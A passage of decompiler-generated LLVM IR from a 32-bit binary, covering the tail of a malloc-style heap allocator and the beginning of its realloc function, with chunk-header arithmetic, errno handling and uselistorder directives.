  br i1 %v10_8053042, label %dec_label_pc_80530c2, label %dec_label_pc_8053048

dec_label_pc_8053048:                             ; preds = %dec_label_pc_8053036
  store i32 %v1_8052d6a, i32* %esi.global-to-local, align 4
  %v2_805304e = sub i32 %v1_805303f, %v1_8052d6a
  store i32 %v2_805304e, i32* %ecx.global-to-local, align 4
  %v2_8053050 = add i32 %v0_8053036, %v1_8052d6a
  store i32 %v2_8053050, i32* @edx, align 4
  %v1_8053053 = or i32 %v1_8052d6a, 1
  store i32 %v1_8053053, i32* %eax.global-to-local, align 4
  store i32 %v2_8053050, i32* @global_var_806188c.495, align 4
  store i32 %v1_8053053, i32* %v2_805303c, align 4
  %v0_805305f.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805305f

dec_label_pc_805305f:                             ; preds = %dec_label_pc_8052cf0, %dec_label_pc_8053048
  %v0_805305f = phi i32 [ %v5_8052d03, %dec_label_pc_8052cf0 ], [ %v0_805305f.pre, %dec_label_pc_8053048 ]
  %v1_805305f = or i32 %v0_805305f, 1
  store i32 %v1_805305f, i32* @ecx, align 4
  %v0_8053062 = load i32, i32* @ebx, align 4
  %v1_8053062 = add i32 %v0_8053062, 8
  store i32 %v1_8053062, i32* %ebx.global-to-local, align 4
  %v1_8053065 = load i32, i32* @edx, align 4
  %v2_8053065 = add i32 %v1_8053065, 4
  %v3_8053065 = inttoptr i32 %v2_8053065 to i32*
  store i32 %v1_805305f, i32* %v3_8053065, align 4
  br label %dec_label_pc_80530cf

dec_label_pc_805306a:                             ; preds = %dec_label_pc_8052aaa
  %v5_8053070 = sub i32 %v1_8052a8d, %v1_8052d6a
  store i32 %v5_8053070, i32* %eax.global-to-local, align 4
  %v2_8053074 = add i32 %v0_8052b58111, %v1_8052d6a
  store i32 %v2_8053074, i32* @edx, align 4
  %v1_8053078 = or i32 %v1_8052d6a, 1
  store i32 %v2_8053074, i32* @global_var_8061890.496, align 16
  store i32 %v1_8053078, i32* %v2_8052a87, align 4
  %v0_8053084 = load i32, i32* %eax.global-to-local, align 4
  %v0_8053086 = load i32, i32* @edx, align 4
  store i32 %v0_8053086, i32* @global_var_806189c.513, align 4
  %v1_805308c = or i32 %v0_8053084, 1
  store i32 %v1_805308c, i32* @ecx, align 4
  store i32 %v0_8053086, i32* @global_var_80618a0.498, align 32
  %v1_8053095 = add i32 %v0_8053086, 8
  %v2_8053095 = inttoptr i32 %v1_8053095 to i32*
  store i32 ptrtoint (i32* @global_var_8061894.497 to i32), i32* %v2_8053095, align 4
  %v0_805309c = load i32, i32* @edx, align 4
  %v1_805309c = add i32 %v0_805309c, 12
  %v2_805309c = inttoptr i32 %v1_805309c to i32*
  store i32 ptrtoint (i32* @global_var_8061894.497 to i32), i32* %v2_805309c, align 4
  %v0_80530a3 = load i32, i32* @ecx, align 4
  %v1_80530a3 = load i32, i32* @edx, align 4
  %v2_80530a3 = add i32 %v1_80530a3, 4
  %v3_80530a3 = inttoptr i32 %v2_80530a3 to i32*
  store i32 %v0_80530a3, i32* %v3_80530a3, align 4
  %v0_80530a6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80530a6 = load i32, i32* @edx, align 4
  %v3_80530a6 = add i32 %v1_80530a6, %v0_80530a6
  %v4_80530a6 = inttoptr i32 %v3_80530a6 to i32*
  store i32 %v0_80530a6, i32* %v4_80530a6, align 4
  br label %dec_label_pc_80530b4

dec_label_pc_80530ab:                             ; preds = %dec_label_pc_8052ab9
  store i32 %v1_8052d6a, i32* %ebx.global-to-local, align 4
  %v0_80530af = load i32, i32* @ebp, align 4
  %v2_80530af = or i32 %v1_8052d6a, 4
  %v3_80530af = add i32 %v0_80530af, %v2_80530af
  %v4_80530af = inttoptr i32 %v3_80530af to i32*
  %v5_80530af = load i32, i32* %v4_80530af, align 4
  %v6_80530af = or i32 %v5_80530af, 1
  store i32 %v6_80530af, i32* %v4_80530af, align 4
  br label %dec_label_pc_80530b4

dec_label_pc_80530b4:                             ; preds = %dec_label_pc_805306a, %dec_label_pc_80530ab
  %v0_80530b4 = load i32, i32* @ebp, align 4
  %v1_80530b4 = add i32 %v0_80530b4, 8
  store i32 %v1_80530b4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80530cf

dec_label_pc_80530b9:                             ; preds = %dec_label_pc_8052ba9
  %v1_80530b9 = load i32, i32* @ebx, align 4
  %v2_80530b9 = add i32 %v0_8052bb8, 4
  %v3_80530b9 = add i32 %v2_80530b9, %v1_80530b9
  %v4_80530b9 = inttoptr i32 %v3_80530b9 to i32*
  %v5_80530b9 = load i32, i32* %v4_80530b9, align 4
  %v6_80530b9 = or i32 %v5_80530b9, 1
  store i32 %v6_80530b9, i32* %v4_80530b9, align 4
  br label %dec_label_pc_80530be

dec_label_pc_80530be:                             ; preds = %dec_label_pc_8052bc1, %dec_label_pc_80530b9
  %v0_80530be = load i32, i32* @ecx, align 4
  store i32 %v0_80530be, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80530cf

dec_label_pc_80530c2:                             ; preds = %dec_label_pc_8052e80, %dec_label_pc_8053036, %dec_label_pc_8052e8a
  %v0_80530c2 = load i32, i32* %stack_var_-92, align 4
  %v1_80530c2 = call i32 @__errno_location(i32 %v0_80530c2)
  store i32 %v1_80530c2, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80530c9 = inttoptr i32 %v1_80530c2 to i32*
  store i32 12, i32* %v1_80530c9, align 4
  br label %dec_label_pc_80530cf

dec_label_pc_80530cf:                             ; preds = %dec_label_pc_80530be, %dec_label_pc_80530b4, %dec_label_pc_805305f, %dec_label_pc_8052d1b, %dec_label_pc_8052ccd, %dec_label_pc_8052a54, %dec_label_pc_80530c2
  store i32 %v2_805298b, i32* @eax, align 4
  store i32 %v2_805298b, i32* %stack_var_-92, align 4
  %v2_80530d8 = call i32 @__pthread_return_void(i32 %v2_805298b, i32 1)
  store i32 %v2_80530d8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80530e0

dec_label_pc_80530e0:                             ; preds = %dec_label_pc_80529a9, %dec_label_pc_80530cf
  %v0_80530e3 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80530e3, i32* %eax.global-to-local, align 4
  %v2_80530e5 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80530e5, i32* @ebx, align 4
  store i32 %v0_8052978, i32* @esi, align 4
  store i32 %v0_8052977, i32* @edi, align 4
  store i32 %v0_8052976, i32* @ebp, align 4
  ret i32 %v0_80530e3

; uselistorder directives
  uselistorder i32 %v0_80530a6, { 1, 0 }
  uselistorder i32 %v0_8053086, { 1, 0, 2 }
  uselistorder i32 %v2_8053023, { 1, 0, 2 }
  uselistorder i32 %v0_8053011, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8052fa8, { 1, 0 }
  uselistorder i32 %v2_8052f96, { 1, 0 }
  uselistorder i32 %v1_8052f4d, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8052f37, { 1, 0, 2 }
  uselistorder i32 %v2_8052f2b, { 1, 2, 0 }
  uselistorder i32 %v2_8052f26, { 1, 0, 2 }
  uselistorder i32 %v1_8052f16, { 2, 1, 0 }
  uselistorder i8 %v0_8052ee4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8052ec7, { 1, 0, 2 }
  uselistorder i32 %v0_8052f7b91, { 2, 0, 1 }
  uselistorder i32 %v0_8052f8992, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_8052ec1, { 2, 1, 0 }
  uselistorder i32 %v8_8052e97, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8052e94, { 1, 0 }
  uselistorder i32 %v0_8052e73, { 1, 0 }
  uselistorder i32 %v2_8052e44, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8052e3c, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8052e29, { 1, 0 }
  uselistorder i32 %v1_8052e20, { 5, 0, 1, 2, 3, 4, 6, 7 }
  uselistorder i32 %v0_8052e0d, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_8052df1, { 1, 0, 2 }
  uselistorder i32 %v2_8052ddd, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8052da6, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8052d9a, { 2, 1, 0 }
  uselistorder i32 %v8_8052d89, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_8052d70, { 1, 0, 2 }
  uselistorder i32 %v0_8052d0c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_8052cdf, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8052cd5, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_8052cc7, { 1, 0 }
  uselistorder i32 %v1_8052c5e, { 1, 0 }
  uselistorder i32 %v3_8052c52, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_8052c62, { 1, 0 }
  uselistorder i32 %v2_8052c4c, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_8052c4912, { 1, 0 }
  uselistorder i32 %v2_8052c3e, { 1, 0 }
  uselistorder i32 %v1_8052c22, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8052c1e, { 2, 1, 0 }
  uselistorder i32 %v1_8052c1a, { 1, 0 }
  uselistorder i32 %v1_8052c0e, { 2, 1, 0 }
  uselistorder i32 %v2_8052c04, { 1, 0 }
  uselistorder i32 %v1_8052c01, { 1, 2, 0 }
  uselistorder i32 %v4_8052b9f, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_8052bea, { 1, 0 }
  uselistorder i32 %v0_8052bb8, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8052b8b, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8052b58, { 1, 2, 0 }
  uselistorder i32 %v2_8052b3c, { 1, 0 }
  uselistorder i32 %v1_8052b32, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_8052b2d.lcssa, { 1, 0 }
  uselistorder i32 %v3_8052b1d, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_8052b14, { 1, 0, 2 }
  uselistorder i32 %v2_8052af0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8052ad8, { 2, 1, 0 }
  uselistorder i32 %v0_8052ac4, { 2, 0, 3, 1 }
  uselistorder i32 %v3_8052a8a, { 1, 0, 2 }
  uselistorder i32 %v0_8052b58111, { 0, 3, 1, 2 }
  uselistorder i32 %v3_8052a37, { 1, 0, 2 }
  uselistorder i32 %v2_8052a29, { 2, 1, 0 }
  uselistorder i32 %v2_8052a04, { 2, 1, 0 }
  uselistorder i8 %v0_80529d2, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_8052d6a, { 13, 31, 11, 2, 29, 12, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_80529bb, { 0, 2, 1 }
  uselistorder i32 %v0_80529a4, { 1, 0 }
  uselistorder i32 %v2_805298b, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ebx.global-to-local, { 20, 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 0, 10, 11, 13, 14, 15, 16, 24, 17, 18, 19, 21, 22, 23 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_8061bc0.510, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134617236, { 2, 3, 1, 0 }
  uselistorder i32* @global_var_80618a0.498, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_806188c.495 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_806188c.495 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_80530e0, { 1, 0 }
  uselistorder label %dec_label_pc_80530cf, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_80530c2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80530be, { 1, 0 }
  uselistorder label %dec_label_pc_80530b4, { 1, 0 }
  uselistorder label %dec_label_pc_805305f, { 1, 0 }
  uselistorder label %dec_label_pc_8053036, { 1, 0 }
  uselistorder label %dec_label_pc_8053023, { 1, 0 }
  uselistorder label %dec_label_pc_8053011, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8052fa3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052f9e, { 1, 0 }
  uselistorder label %dec_label_pc_8052f82, { 1, 0 }
  uselistorder label %dec_label_pc_8052f2b, { 1, 0 }
  uselistorder label %dec_label_pc_8052f14, { 1, 0 }
  uselistorder label %dec_label_pc_8052efd, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8052e80, { 1, 0 }
  uselistorder label %dec_label_pc_8052e73, { 1, 0 }
  uselistorder label %dec_label_pc_8052e34, { 1, 0 }
  uselistorder label %dec_label_pc_8052e0d, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8052df1, { 1, 0 }
  uselistorder label %dec_label_pc_8052dd8, { 1, 0 }
  uselistorder label %dec_label_pc_8052dba, { 1, 0 }
  uselistorder label %dec_label_pc_8052cd5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052ccd, { 1, 0 }
  uselistorder label %dec_label_pc_8052cb6, { 1, 0 }
  uselistorder label %dec_label_pc_8052c49, { 1, 0 }
  uselistorder label %dec_label_pc_8052c4e.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8052c22, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052ba9, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_8052b30, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8052b19, { 1, 0 }
  uselistorder label %dec_label_pc_8052a87, { 1, 0 }
  uselistorder label %dec_label_pc_8052b58.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052a54, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_80529d2, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_80530ee = load i32, i32* @esi, align 4
  %v0_80530ef = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_80530f7 = icmp eq i32* %arg1, null
  %v1_80530fc = icmp eq i1 %v4_80530f7, false
  br i1 %v1_80530fc, label %dec_label_pc_805310e, label %dec_label_pc_80530fe

dec_label_pc_80530fe:                             ; preds = %entry
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_8053102 = call i32 @malloc(i32 %arg2)
  store i32 %v1_8053102, i32* %eax.global-to-local, align 4
  store i32 %v1_8053102, i32* @ebx, align 4
  br label %dec_label_pc_8053407

dec_label_pc_805310e:                             ; preds = %entry
  %v1_805310e = icmp eq i32 %arg2, 0
  %v1_8053110 = icmp eq i1 %v1_805310e, false
  br i1 %v1_8053110, label %dec_label_pc_8053123, label %dec_label_pc_8053112

dec_label_pc_8053112:                             ; preds = %dec_label_pc_805310e
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8053119 = call i32 @free(i32 %tmp7)
  store i32 %v1_8053119, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053407

dec_label_pc_8053123:                             ; preds = %dec_label_pc_805310e
  %v2_805312e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805312e, i32* @eax, align 4
  store i32 %v2_805312e, i32* %stack_var_-60, align 4
  %v2_8053133 = call i32 @__pthread_return_void(i32 %v2_805312e, i32 134562611)
  store i32 %v2_8053133, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805b3f0.493 to i32), i32* %stack_var_-60, align 4
  %v1_805313f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b3f0.493 to i32))
  store i32 %v1_805313f, i32* %eax.global-to-local, align 4
  %v0_8053147 = load i32, i32* @ebx, align 4
  %tmp20 = icmp ult i32 %v0_8053147, -32
  br i1 %tmp20, label %dec_label_pc_805315e, label %dec_label_pc_805314c

dec_label_pc_805314c:                             ; preds = %dec_label_pc_8053123
  %v0_805314c = load i32, i32* %stack_var_-60, align 4
  %v1_805314c = call i32 @__errno_location(i32 %v0_805314c)
  store i32 %v1_805314c, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8053153 = inttoptr i32 %v1_805314c to i32*
  store i32 12, i32* %v1_8053153, align 4
  br label %dec_label_pc_805340a

dec_label_pc_805315e:                             ; preds = %dec_label_pc_8053123
  %v1_805315e = add i32 %v0_8053147, 11
  %tmp21 = icmp ult i32 %v1_805315e, 16
  br i1 %tmp21, label %dec_label_pc_8053175, label %dec_label_pc_805316e

dec_label_pc_805316e:                             ; preds = %dec_label_pc_805315e
  %v1_805316e = and i32 %v1_805315e, -8
  br label %dec_label_pc_8053175

dec_label_pc_8053175:                             ; preds = %dec_label_pc_805315e, %dec_label_pc_805316e
  %stack_var_-40.0 = phi i32 [ %v1_805316e, %dec_label_pc_805316e ], [ 16, %dec_label_pc_805315e ]
  %storemerge27 = phi i32 [ %v1_805316e, %dec_label_pc_805316e ], [ %v1_805315e, %dec_label_pc_805315e ]
  store i32 %storemerge27, i32* %eax.global-to-local, align 4
  %v1_8053179 = add i32 %tmp7, -8
  store i32 %v1_8053179, i32* @edi, align 4
  %v1_805317c = add i32 %tmp7, -4
  %v2_805317c = inttoptr i32 %v1_805317c to i32*
  %v3_805317c = load i32, i32* %v2_805317c, align 4
  store i32 %v3_805317c, i32* @edx, align 4
  %v1_8053181 = and i32 %v3_805317c, -4
  store i32 %v1_8053181, i32* %eax.global-to-local, align 4
  %v2_8053188 = and i32 %v3_805317c, 2
  %v3_8053188 = icmp eq i32 %v2_8053188, 0
  %v1_805318b = icmp eq i1 %v3_8053188, false
  br i1 %v1_805318b, label %dec_label_pc_8053325, label %dec_label_pc_8053191

dec_label_pc_8053191:                             ; preds = %dec_label_pc_8053175
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8053181, i32* @ebx, align 4
  %v7_8053197 = icmp ult i32 %v1_8053181, %stack_var_-40.0
  %v1_8053199 = icmp eq i1 %v7_8053197, false
  br i1 %v1_8053199, label %dec_label_pc_80532d0, label %dec_label_pc_805319f

dec_label_pc_805319f:                             ; preds = %dec_label_pc_8053191
  %v2_805319f = add i32 %v1_8053181, %v1_8053179
  store i32 %v2_805319f, i32* @esi, align 4
  %v1_80531a2 = load i32, i32* @global_var_806188c.495, align 4
  %v12_80531a2 = icmp eq i32 %v2_805319f, %v1_80531a2
  %v1_80531a8 = icmp eq i1 %v12_80531a2, false
  %v1_80531e2 = add i32 %v2_805319f, 4
  %v2_80531e2 = inttoptr i32 %v1_80531e2 to i32*
  %v3_80531e2 = load i32, i32* %v2_80531e2, align 4
  br i1 %v1_80531a8, label %dec_label_pc_80531e2, label %dec_label_pc_80531aa

dec_label_pc_80531aa:                             ; preds = %dec_label_pc_805319f
  %v1_80531af = and i32 %v3_80531e2, -4
  %v2_80531b2 = add i32 %v1_80531af, %v1_8053181
  store i32 %v2_80531b2, i32* %ecx.global-to-local, align 4
  %v1_80531b8 = add i32 %stack_var_-40.0, 16
  store i32 %v1_80531b8, i32* %eax.global-to-local, align 4
  %v7_80531bb = icmp ult i32 %v2_80531b2, %v1_80531b8
  br i1 %v7_80531bb, label %dec_label_pc_8053220, label %dec_label_pc_80531bf

dec_label_pc_80531bf:                             ; preds = %dec_label_pc_80531aa
  %v1_80531bf = urem i32 %v3_805317c, 2
  %v5_80531c2 = or i32 %v1_80531bf, %stack_var_-40.0
  store i32 %v5_80531c2, i32* @edx, align 4
  store i32 %v5_80531c2, i32* %v2_805317c, align 4
  %v0_80531cd = load i32, i32* %ecx.global-to-local, align 4
  %v2_80531cd = sub i32 %v0_80531cd, %stack_var_-40.0
  %v0_80531cf = load i32, i32* @edi, align 4
  %v2_80531cf = add i32 %v0_80531cf, %stack_var_-40.0
  store i32 %v2_80531cf, i32* %eax.global-to-local, align 4
  %v1_80531d2 = or i32 %v2_80531cd, 1
  store i32 %v1_80531d2, i32* %ecx.global-to-local, align 4
  store i32 %v2_80531cf, i32* @global_var_806188c.495, align 4
  %v2_80531da = add i32 %v2_80531cf, 4
  %v3_80531da = inttoptr i32 %v2_80531da to i32*
  store i32 %v1_80531d2, i32* %v3_80531da, align 4
  br label %dec_label_pc_80533f5

dec_label_pc_80531e2:                             ; preds = %dec_label_pc_805319f
  %v1_80531e7 = and i32 %v3_80531e2, -2
  store i32 %v1_80531e7, i32* %eax.global-to-local, align 4
  %v3_80531ea = add i32 %v1_80531e2, %v1_80531e7
  %v4_80531ea = inttoptr i32 %v3_80531ea to i8*
  %v5_80531ea = load i8, i8* %v4_80531ea, align 1
  %v6_80531ea = urem i8 %v5_80531ea, 2
  %v7_80531ea = icmp eq i8 %v6_80531ea, 0
  %v1_80531ef = icmp eq i1 %v7_80531ea, false
  br i1 %v1_80531ef, label %dec_label_pc_8053220, label %dec_label_pc_80531f1

dec_label_pc_80531f1:                             ; preds = %dec_label_pc_80531e2
  %v1_80531f1 = and i32 %v3_80531e2, -4
  %v2_80531f8 = add i32 %v1_80531f1, %v1_8053181
  store i32 %v2_80531f8, i32* @ebx, align 4
  %v10_80531fa = icmp ult i32 %v2_80531f8, %stack_var_-40.0
  br i1 %v10_80531fa, label %dec_label_pc_8053220, label %dec_label_pc_8053200

dec_label_pc_8053200:                             ; preds = %dec_label_pc_80531f1
  %v1_8053200 = add i32 %v1_8053181, %tmp7
  %v2_8053200 = inttoptr i32 %v1_8053200 to i32*
  %v3_8053200 = load i32, i32* %v2_8053200, align 4
  store i32 %v3_8053200, i32* @edx, align 4
  %v1_8053203 = add i32 %v2_805319f, 12
  %v2_8053203 = inttoptr i32 %v1_8053203 to i32*
  %v3_8053203 = load i32, i32* %v2_8053203, align 4
  store i32 %v3_8053203, i32* %eax.global-to-local, align 4
  %v1_8053206 = add i32 %v3_8053200, 12
  %v2_8053206 = inttoptr i32 %v1_8053206 to i32*
  %v3_8053206 = load i32, i32* %v2_8053206, align 4
  %v15_8053206 = icmp eq i32 %v3_8053206, %v2_805319f
  %v1_8053209 = icmp eq i1 %v15_8053206, false
  br i1 %v1_8053209, label %dec_label_pc_8053210, label %dec_label_pc_805320b

dec_label_pc_805320b:                             ; preds = %dec_label_pc_8053200
  %v1_805320b = add i32 %v3_8053203, 8
  %v2_805320b = inttoptr i32 %v1_805320b to i32*
  %v3_805320b = load i32, i32* %v2_805320b, align 4
  %v15_805320b = icmp eq i32 %v3_805320b, %v2_805319f
  br i1 %v15_805320b, label %dec_label_pc_8053215, label %dec_label_pc_8053210

dec_label_pc_8053210:                             ; preds = %dec_label_pc_805320b, %dec_label_pc_8053200
  %v0_8053210 = call i32 @abort()
  store i32 %v0_8053210, i32* %eax.global-to-local, align 4
  %v1_8053215.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053215

dec_label_pc_8053215:                             ; preds = %dec_label_pc_805320b, %dec_label_pc_8053210
  %v1_8053215 = phi i32 [ %v3_8053200, %dec_label_pc_805320b ], [ %v1_8053215.pre, %dec_label_pc_8053210 ]
  %v0_8053215 = phi i32 [ %v3_8053203, %dec_label_pc_805320b ], [ %v0_8053210, %dec_label_pc_8053210 ]
  %v2_8053215 = add i32 %v1_8053215, 12
  %v3_8053215 = inttoptr i32 %v2_8053215 to i32*
  store i32 %v0_8053215, i32* %v3_8053215, align 4
  %v0_8053218 = load i32, i32* @edx, align 4
  %v1_8053218 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053218 = add i32 %v1_8053218, 8
  %v3_8053218 = inttoptr i32 %v2_8053218 to i32*
  store i32 %v0_8053218, i32* %v3_8053218, align 4
  %v0_80532d0.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80532d0

dec_label_pc_8053220:                             ; preds = %dec_label_pc_80531f1, %dec_label_pc_80531e2, %dec_label_pc_80531aa
  %v1_8053227 = add i32 %stack_var_-40.0, -7
  store i32 %v1_8053227, i32* %eax.global-to-local, align 4
  store i32 %v1_8053227, i32* %stack_var_-60, align 4
  %v1_805322b = call i32 @malloc(i32 %v1_8053227)
  store i32 %v1_805322b, i32* %eax.global-to-local, align 4
  store i32 %v1_805322b, i32* @edx, align 4
  %v1_8053235 = icmp eq i32 %v1_805322b, 0
  br i1 %v1_8053235, label %dec_label_pc_80533f1, label %dec_label_pc_805323d

dec_label_pc_805323d:                             ; preds = %dec_label_pc_8053220
  %v1_805323d = add i32 %v1_805322b, -8
  store i32 %v1_805323d, i32* %ebx.global-to-local, align 4
  %v1_8053240 = load i32, i32* @esi, align 4
  %v12_8053240 = icmp eq i32 %v1_805323d, %v1_8053240
  %v1_8053242 = add i32 %v1_805322b, -4
  %v2_8053242 = inttoptr i32 %v1_8053242 to i32*
  %v3_8053242 = load i32, i32* %v2_8053242, align 4
  store i32 %v3_8053242, i32* %eax.global-to-local, align 4
  %v1_8053245 = icmp eq i1 %v12_8053240, false
  br i1 %v1_8053245, label %dec_label_pc_8053253, label %dec_label_pc_8053247

dec_label_pc_8053247:                             ; preds = %dec_label_pc_805323d
  %v1_8053247 = and i32 %v3_8053242, -4
  store i32 %v1_8053247, i32* %eax.global-to-local, align 4
  store i32 %v1_8053181, i32* @edx, align 4
  %v2_805324e = add i32 %v1_8053247, %v1_8053181
  store i32 %v2_805324e, i32* @ebx, align 4
  br label %dec_label_pc_80532d0

dec_label_pc_8053253:                             ; preds = %dec_label_pc_805323d
  %v1_8053257 = add i32 %v1_8053181, -4
  store i32 %v1_8053257, i32* %eax.global-to-local, align 4
  %v2_805325c = udiv i32 %v1_8053257, 4
  store i32 %v2_805325c, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8053257, 37
  br i1 %tmp, label %dec_label_pc_8053275, label %dec_label_pc_8053264

dec_label_pc_8053264:                             ; preds = %dec_label_pc_8053253
  store i32 %v1_805322b, i32* %stack_var_-60, align 4
  %v3_805326b = inttoptr i32 %v1_805322b to i16*
  %v4_805326b = call i32 @memcpy(i16* %v3_805326b, i32 %tmp7, i32 %v1_8053257)
  store i32 %v4_805326b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80532bc

dec_label_pc_8053275:                             ; preds = %dec_label_pc_8053253
  store i32 %tmp7, i32* @esi, align 4
  %v2_805327c = load i32, i32* %arg1, align 4
  store i32 %v2_805327c, i32* %eax.global-to-local, align 4
  %v2_805327e = inttoptr i32 %v1_805322b to i32*
  store i32 %v2_805327c, i32* %v2_805327e, align 4
  %v0_8053280 = load i32, i32* @esi, align 4
  %v1_8053280 = add i32 %v0_8053280, 4
  %v2_8053280 = inttoptr i32 %v1_8053280 to i32*
  %v3_8053280 = load i32, i32* %v2_8053280, align 4
  store i32 %v3_8053280, i32* %eax.global-to-local, align 4
  %v1_8053283 = load i32, i32* @edx, align 4
  %v2_8053283 = add i32 %v1_8053283, 4
  %v3_8053283 = inttoptr i32 %v2_8053283 to i32*
  store i32 %v3_8053280, i32* %v3_8053283, align 4
  %v0_8053286 = load i32, i32* @esi, align 4
  %v1_8053286 = add i32 %v0_8053286, 8
  %v2_8053286 = inttoptr i32 %v1_8053286 to i32*
  %v3_8053286 = load i32, i32* %v2_8053286, align 4
  store i32 %v3_8053286, i32* %eax.global-to-local, align 4
  %v1_8053289 = load i32, i32* @edx, align 4
  %v2_8053289 = add i32 %v1_8053289, 8
  %v3_8053289 = inttoptr i32 %v2_8053289 to i32*
  store i32 %v3_8053286, i32* %v3_8053289, align 4
  %tmp28 = icmp ult i32 %v1_8053257, 17
  br i1 %tmp28, label %dec_label_pc_80532bc, label %dec_label_pc_805328e

dec_label_pc_805328e:                             ; preds = %dec_label_pc_8053275
  %v0_805328e = load i32, i32* @esi, align 4
  %v1_805328e = add i32 %v0_805328e, 12
  %v2_805328e = inttoptr i32 %v1_805328e to i32*
  %v3_805328e = load i32, i32* %v2_805328e, align 4
  store i32 %v3_805328e, i32* %eax.global-to-local, align 4
  %v0_8053291 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053294 = load i32, i32* @edx, align 4
  %v2_8053294 = add i32 %v1_8053294, 12
  %v3_8053294 = inttoptr i32 %v2_8053294 to i32*
